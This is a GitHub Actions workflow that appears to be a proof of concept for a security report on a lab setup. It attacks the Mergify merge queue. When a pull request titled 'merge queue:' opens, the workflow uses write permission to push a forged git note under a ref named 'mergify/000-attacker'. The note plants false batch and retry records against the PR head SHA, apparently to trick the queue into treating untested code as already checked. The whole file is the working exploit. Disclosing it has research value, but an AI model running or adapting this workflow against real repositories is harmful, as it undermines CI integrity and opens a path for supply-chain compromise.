name: h1lab-forge-queue-note

on:
  pull_request:

permissions:
  contents: write

jobs:
  forge:
    if: startsWith(github.event.pull_request.title, 'merge queue:')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          fetch-depth: 0

      - name: Create a competing Mergify note
        env:
          TARGET_SHA: ${{ github.event.pull_request.head.sha }}
          KNOWN_SUCCESS_SHA: e691904f23b02af5bdf2a1546183828294c19f87
        run: |
          git config user.name h1lab-owned-control
          git config user.email h1lab-owned-control@users.noreply.github.com
          printf '%s\n' \
            "checking_base_sha: $TARGET_SHA" \
            "previous_check_retries: []" \
            "previous_failed_batches:" \
            "  - batch_pr_head_sha: $KNOWN_SUCCESS_SHA" \
            > /tmp/h1lab-queue-note.yml
          git notes --ref=refs/notes/mergify/000-attacker add \
            -f -F /tmp/h1lab-queue-note.yml "$TARGET_SHA"
          git push origin refs/notes/mergify/000-attacker
